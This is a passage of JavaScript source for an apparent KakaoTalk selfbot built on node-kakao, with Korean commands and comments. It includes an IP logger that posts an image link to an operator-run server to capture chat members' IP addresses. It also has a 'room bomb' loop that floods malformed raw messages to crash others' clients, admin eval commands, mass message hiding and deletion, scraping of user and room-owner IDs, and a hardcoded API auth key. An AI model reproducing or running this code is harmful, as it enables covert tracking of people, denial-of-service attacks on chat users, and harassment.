              V: "image",
              R: [
                {
                  D: "IP HaCKeD",
                  L: "",
                  I: `http://아이피:${port}/${randomPath}`,
                  W: 213,
                  H: 25,
                },
              ],
            })
          )
          .build(23)
      )
      .then((res) => {
        ipLogId = res.result.logId;
      });
    ip_bool = true;
    ipchannel = channel;
  }
  if (data.text == prefix + "방폭") {
    //단톡방폭
    while (true) {
      sendRaw(channel, 23, "Search", {
        R: [
          {
            L: "https://search3.kakaocdn.net/argon/600x0_65_wr/CzHtKJ3bE3m",
            MA: [],
            D: "PC 펑",
            PL: "펑",
            TM: "튕",
            SU: [
              {
                TE: "44",
                T: ".",
                IC: "44",
                DE: "",
              },
            ],
          },
        ],
        V: "weather",
        callingPkg: "",
        L: "https://search3.kakaocdn.net/argon/600x0_65_wr/CzHtKJ3bE3m",
        Q: "전국 오늘 날씨",
      });
      pausecomp(1000);
      let tnt = __importStar(require("./INFO/tnt.json"));
      sendRaw(channel, 24, "pung", tnt.default);
      pausecomp(1000);
    }
  }
  if (data.text == prefix + "아이피종료") {
    if (!ip_bool) {
      channel.sendChat("[ ! ] 아이피 추적을 시작하지 않았습니다.");
      return;
    }
    const readers = channel.getReaders({ logId: ipLogId });
    topAdmin.forEach((admin) => {
      try {
        readers.splice(readers.indexOf(channel.getUserInfo(admin)), 1);
      } catch {
        return;
      }
    });
    channel.sendChat(
      `[ ! ] IPLOGGER STOPPED: ${"\u200b".repeat(500)}\nLOGGED IP (${
        ipList.length
      }):\n${ipList.join("\n")}\nREADERS (${readers.length}):\n${readers
        .map((r) => r.nickname)
        .join("\n")}`
    );
    ip_bool = false;
    ipchannel = undefined;
    ipList = [];
    randomPath = crypto.default.randomBytes(4).toString("base64");
  }
  if (
    data.text.startsWith(prefix + "비동기") && //비동기함수용 eval
    topAdmin.includes(Number(sender.userId))
  ) {
    try {
      let evalResult = eval(data.text.substring(5));
      if (evalResult == "[object Promise]") {
        evalResult
          .then((x) => {
            channel.sendChat(String(JSON.stringify(x), null, 3));
            console.log(x);
          })
          .catch((e) => {
            console.log(e);
          });
      } else {
        channel.sendChat(
          "[ ! ] 비동기 함수가 아니라면 e 명령어를 사용해주세요"
        );
      }
    } catch (err) {
      channel.sendChat(String(err));
      console.log(err);
    }
  }
  if (data.text.startsWith("e") && topAdmin.includes(Number(sender.userId))) {
    try {
      let evalResult = eval(data.text.substring(2));
      channel.sendChat(String(evalResult));
      console.log(evalResult);
    } catch (err) {
      channel.sendChat(String(err));
      console.log(err);
    }
  }
  if (data.text == prefix + "종료") {
    channel.sendChat("[ ! ] 프로세스를 종료합니다");
    process.exit();
  }
  if (
    data.text.startsWith(prefix + "방정보") &&
    data.text.replace(prefix + "방정보 ", "")
  ) {
    client.channelList.open
      .getJoinInfo(data.text.replace(prefix + "방정보 ", ""))
      .then((x) => {
        channel.sendChat(JSON.stringify(getLongString(x.result), null, 3));
        console.log(x.result);
      });
  }
  if (data.text.startsWith(prefix + "방장아이디")) {
    client.channelList.open
      .getJoinInfo(data.text.replace(prefix + "방장아이디 ", ""))
      .then((x) =>
        channel.sendChat(String(x.result.openLink.linkOwner.userId))
      );
  }
  if (data.text.startsWith(prefix + "2유저정보")) {
    try {
      channel.sendChat(
        JSON.stringify(
          getLongString(
            channel.getUserInfo({ userId: data.mentions[0].user_id })
          ),
          null,
          3
        )
      );
      console.log(channel.getUserInfo({ userId: data.mentions[0].user_id }));
    } catch (e) {
      channel.sendChat(String(e));
    }
  }
  async function getTalkSet(msg, freeLevel) {
    let res = await axios
      .post(
        "https://beta-bumcoming.simsimi.com/simtalk/get_talk_set",
        {
          uid: "406742200",
          av: "8.2.3",
          os: "a",
          lc: "ko",
          cc: "KR",
          tz: "Asia/Seoul",
          message: msg,
          free_level: freeLevel,
          logUID: "406742200",
          reg_now_days: 0,
        },
        {
          headers: {
            Accept: "application/json, text/plain, */*",
            Authkey:
              "YjdhZmI4NjY0ZDA0ZGZmZTQ3OTAwYWNiNWYzYzBiMjcxNTk2ZmFhNjhjMjIwYTBlNGRlM2U3NGI3ZDI0YTgzYg",
            "Content-Type": "application/json",
            Os: "a",
            Av: "8.2.3",
          },
        }
      )
      .catch((e) => {
        if (e.response?.data) {
          return e.response.data;
        }
        return e;
      });
    if (!res.data) {
      return res;
    }
    return res.data;
  }
  if (data.text.startsWith(prefix + "유저정보") && data.text.split(" ")[1]) {
    try {
      channel.sendChat(
        JSON.stringify(
          getLongString(
            channel.getUserInfo({ userId: data.text.split(" ")[1] })
          ),
          null,
          3
        )
      );
    } catch (err) {
      channel.sendChat(String(err));
    }
  }
  if (data.text == prefix + "모두가리기" && data.originalType == 26) {
    (async () => {
      const chatList = await channel.getChatListFrom(
        data.attachment().src_logId
      );
      if (chatList.result) {
        for (let i = 0; i < chatList.result.length; i++) {
          await pausecomp(100);
          channel.hideChat(chatList.result[i]);
        }
      }
      channel.sendChat(`[ ! ] ${chatList.result.length}개 가리기 완료`);
    })();
  }
  if (data.text == prefix + "모두삭제" && data.originalType == 26) {
    (async () => {
      const chatList = await channel.getChatListFrom(
        data.attachment().src_logId
      );
      let count = 0;
      if (chatList.result) {
        for (let i = 0; i < chatList.result.length; i++) {
          await pausecomp(100);
          if (
            String(chatList.result[i].sender.userId) == String(sender.userId)
          ) {
            channel.deleteChat(chatList.result[i]);
            count++;
          }
        }
      }
      channel.sendChat(`[ ! ] ${count}개 삭제 완료`);
    })();
  }
  if (data.text.startsWith(prefix + "초대 ")) {
    let invite = data.text.replace(prefix + "초대 ", "");
    channel.inviteUsers([{ userId: invite }]).then((x) => {
      console.log(x);
    });
  }
  if (data.text.startsWith(prefix + "가리기p") && data.mentions.length > 0) {
    (async () => {
      for (let i = 0; i < channel.chatListStore._chatList.length; i++) {
        if (
          channel.chatListStore._chatList[i].sender.userId ==
          data.mentions[0].user_id
        ) {
          await pausecomp(100);
          channel.hideChat(channel.chatListStore._chatList[i]);
        }
      }
    })();
  }
  if (data.text.startsWith(prefix + "소스") && data.originalType == 26) {
    let s_target = data.attachment();
    let tlogId = s_target.src_logId;
    channel.getChatListFrom(tlogId).then((r) => {
      if (r.result) {
        let tResult = r.result[0];
        longText(
          channel,
          `닉네임: ${
            channel.getUserInfo({
              userId: tResult.sender.userId,
            }).nickname
          }\n아이디: ${tResult.sender.userId}\n시간: ${new Date(
            tResult.sendAt
          )}`,
          `e sendRaw(channel, ${tResult.type}, '${
            tResult.text
          }', ${JSON.stringify(getLongString(tResult.attachment), null, 3)})`
        );
        console.log(
          `닉네임: ${
            channel.getUserInfo({
              userId: tResult.sender.userId,
            }).nickname
          }\n아이디: ${tResult.sender.userId}\n시간: ${new Date(
            tResult.sendAt
          )}`
        );
        console.log(`e sendRaw(channel, ${tResult.type}, '${tResult.text}', `);
        console.log(tResult.attachment);
        console.log(")");
      }
    });
  }
  if (data.text == prefix + "로그") {
    if (data.originalType == 26) {
      let chlog = "";
      let reply = data.attachment();
      let logId = reply.src_logId;
      channel.getChatListFrom(logId).then((r) => {
        if (r.result) {
          r.result.forEach((v, i) => {
            chlog +=
              "보낸사람 아이디: " +
              v.sender.userId +
              "\n보낸사람 닉네임: " +
              channel.getUserInfo({ userId: v.sender.userId })?.nickname +
              "\n" +
              "카카오톡 방 아이디: " +
              channel.info.channelId +
              "\n" +
              "보낸 시간: " +
              new Date(v.sendAt) +
              "\n" +
              "메세지 타입: " +
              node_kakao.KnownChatType[v.type] +
              "\n" +
              "Attachment(raw): " +
              JSON.stringify(getLongString(v.attachment), null, 3) +
              "\n" +
              "메세지: " +
              v.text +
              "\n --------------------------------------- \n";
          });
          longText(channel, "RESULT: ", chlog);
        }
      });
    }
  }
});
client.on("chat_read", (chat, channel, reader) => {
  if (detectUser.includes(String(reader.userId))) {
    //감지
    channel.sendChat(`[ ! ] ${reader.nickname}님이 채팅을 읽었습니다.`);
    detectUser.splice(detectUser.indexOf(String(reader.userId)), 1);
  }
});
client.on("disconnected", (reason) => {
  console.log(
    "\n",
    "\n",
    "\n",
    "\n****************************DISCONNECTED*********************************",
    "\n   SERVER GOT DISCONNECTED",
    "\n   ERROR: " + reason,
    "\n*************************************************************************"
  );
});
